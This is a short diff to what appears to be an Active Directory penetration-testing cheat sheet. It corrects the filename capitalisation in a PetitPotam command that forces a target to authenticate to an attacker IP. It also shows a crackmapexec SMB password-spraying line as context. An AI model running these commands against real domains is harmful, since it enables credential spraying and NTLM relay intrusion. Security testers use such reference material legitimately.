@@ -301,7 +301,7 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   
   ### Force NTLM authentication
   ```bash
-  sudo python3 Petitpotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
+  sudo python3 PetitPotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
   ```
 </details> 
   
